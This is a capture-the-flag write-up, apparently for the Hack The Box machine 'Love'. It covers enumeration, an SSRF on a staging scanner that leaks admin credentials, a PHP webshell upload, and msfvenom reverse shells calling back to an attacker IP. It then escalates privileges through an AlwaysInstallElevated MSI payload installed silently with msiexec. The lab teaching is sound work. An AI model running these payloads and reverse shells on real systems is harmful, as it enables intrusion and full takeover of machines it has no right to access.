# Notes:
* [Writeup#Priv Esc|Always install privileged](/assets/Boxes/Love/Writeup%23Priv%20Esc%7CAlways%20install%20privileged)


## Enumeration

We scan with nmap and find these ports:
* 80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
* 135/tcp  open  msrpc        Microsoft Windows RPC
* 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
* 443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
* 445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
* 3306/tcp open  mysql?
* 5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)

We see that the webpage has a login, and it doesn't seem vulnerable to SQLi, let's enumerate directories with gobuster.
`gobuster dir -u http://10.10.10.239/ -w /usr/share/wordlists/dirb/common.txt -r`
We see several paths

![Pasted image 20210709165815.png](/assets/Pasted%20image%2020210709165815.png)

port 443 with SSL gives us forbidden, we notice there is host named `staging.love.htb` in the certificate, let's add this host to our `/etc/hosts`

We see it's scanning service, when we try to give it a file from our machine it outputs the content, let's see if we can get something from localhost that are forbidden for us, like port 5000.

It's a password dashboard. we have admin creds.
`admin: @LoveIsInTheAir!!!!`
Connect in the /admin page.

We have access to admin dashboard.
We go to the voters page and see there is 1 voter.
![Pasted image 20210709174255.png](/assets/Pasted%20image%2020210709174255.png)
We take the ID and edit the password to `password`

We see that we can upload a user photo to our admin, let's upload a php webshell, and query it from the /images folder of the website, make sure to change the shell to `cmd`.

 Since it didn't work for me, i uploaded a reverse shell exe and used the shell variable of the php webshell to execute the reverse shell compiled with msfvenom.
 ```php
 <?php
 system('rev.exe');
 ?>
 ```
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.152 LPORT=4444 -f exe > rev.exe
 ```
 
 We get a shell:
 
 ![Pasted image 20210709180908.png](/assets/Pasted%20image%2020210709180908.png)
 We get the user flag in desktop of user`phoebe`
 # Priv Esc
 Let's get Administrator user.
 ```batch
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![Pasted image 20210709181428.png](/assets/Pasted%20image%2020210709181428.png)
So we can exploit [Always Install Elevated exploit](https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated)

According to the article, here is the steps we need to follow
```md
# Generate payload to add user to admin group
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi

OR

# Create a reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi

# Run it on the target machine:
msiexec /quiet /qn /i setup.msi 
msiexec /quiet /qn /i reverse.msi        <--- Needs a netcat listener
```
So we generate an msi file. An msi file is a installer in windows, so we can install an exe that will execute a reverse shell with admin permissions
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.152 LPORT=1234 -f msi -o reverse.msi
```
We upload it using curl and a Python server on our machine
![Pasted image 20210709182227.png](/assets/Pasted%20image%2020210709182227.png)
We install the `reverse.msi` with
```batch
msiexec /quiet /qn /i reverse.msi
```
And we get our admin shell
![Pasted image 20210709183353.png](/assets/Pasted%20image%2020210709183353.png)